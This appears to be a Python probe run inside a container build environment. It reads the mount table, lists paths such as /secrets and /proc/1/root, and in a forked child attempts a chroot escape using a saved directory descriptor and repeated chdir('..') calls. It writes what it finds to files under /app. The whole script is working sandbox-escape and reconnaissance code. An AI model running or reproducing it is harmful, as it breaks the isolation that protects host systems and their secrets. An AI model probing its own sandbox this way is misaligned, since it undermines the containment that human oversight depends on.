import os, sys, glob
res=[]
res.append("=== mountinfo (self) ===")
try:
    for ln in open('/proc/self/mountinfo'): res.append("  "+ln.strip()[:170])
except Exception as e: res.append(str(e))
res.append("=== paths ===")
for p in ['/','/..','/var/tmp','/build','/secrets','/proc/1/root','/proc/self/root']:
    try: res.append("  %s -> %s"%(p, os.listdir(p)[:15]))
    except Exception as e: res.append("  %s -> %s"%(p,type(e).__name__))
res.append("glob buildah:"+str(glob.glob('/var/tmp/buildah*')[:5])+str(glob.glob('/build*')[:5]))
# chroot escape in a FORKED child so the build's own root is untouched
pid=os.fork()
if pid==0:
    try:
        rf=os.open("/",os.O_RDONLY|os.O_DIRECTORY)
        os.makedirs("/tmp/e/d",exist_ok=True); os.chdir("/tmp/e/d"); os.chroot("/tmp/e/d")
        for _ in range(20):
            try: os.chdir("..")
            except Exception: break
        esc1=os.getcwd()+":"+str(os.listdir(".")[:10])
        try:
            os.fchdir(rf); os.chroot("."); esc2=str(os.listdir("/")[:20])
        except Exception as e: esc2=type(e).__name__+":"+str(e)[:40]
        open("/app/CHROOT_CHILD.txt","w").write("after-ups=%s\npost-escape-root=%s\n"%(esc1,esc2))
    except Exception as e:
        open("/app/CHROOT_CHILD.txt","w").write("fork-child-err %s %s"%(type(e).__name__,e))
    os._exit(0)
else:
    os.waitpid(pid,0)
open("/app/CHROOT_RESULT.txt","w").write("\n".join(res))
# cb 1792264832
